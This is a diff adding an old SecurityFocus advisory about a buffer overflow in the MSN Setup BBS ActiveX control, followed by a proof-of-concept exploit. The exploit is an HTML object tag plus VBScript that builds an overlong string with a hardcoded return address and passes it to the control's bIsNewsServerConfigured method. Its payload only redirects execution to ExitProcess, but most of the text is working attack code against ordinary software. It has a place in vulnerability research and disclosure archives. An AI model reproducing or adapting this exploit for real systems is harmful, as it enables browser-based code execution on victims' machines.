@@ -1,0 +1,42 @@
+source: http://www.securityfocus.com/bid/668/info
+
+There is a buffer overflow in the 4.71.0.10 version of the MSN Setup BBS ActiveX control (setupbbs.ocx).. This ActiveX control is marked 'Safe for Scripting' . Arbitrary commands may be executed if the ActiveX control is run in a malicious manner. 
+
+SETUPBBS:
+
+When this control is initialised, it will display a prompt 
+notifying the user that the control is capable of modifying 
+Mail and News configuration etc and asks the user whether 
+he/she wishes the control to proceed. This control is 
+exploitable through two different methods, vAddNewsServer 
+and bIsNewsServerConfigured. I have simply RET'd to 
+ExitProcess with this exploit, although there are other 
+possibilities.
+
+<object
+   classid="clsid:8F0F5093-0A70-11D0-BCA9-00C04FD85AA6"
+ id="setupbbs"></OBJECT>
+
+<script language="vbscript"><!--
+
+msgbox("MSN Setup BBS Buffer Overrun" + Chr(10) + "Written 
+by Shane Hird")
+
+expstr="AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+
+'RET address (ExitProcess BFF8D4CA)
+expstr = expstr + Chr(202) + Chr(212) + Chr(248) + Chr(191)
+
+'This buffer overrun can be triggered by either method.
+'setupbbs.vAddNewsServer expstr, true
+setupbbs.bIsNewsServerConfigured expstr
+
+--></script>
+
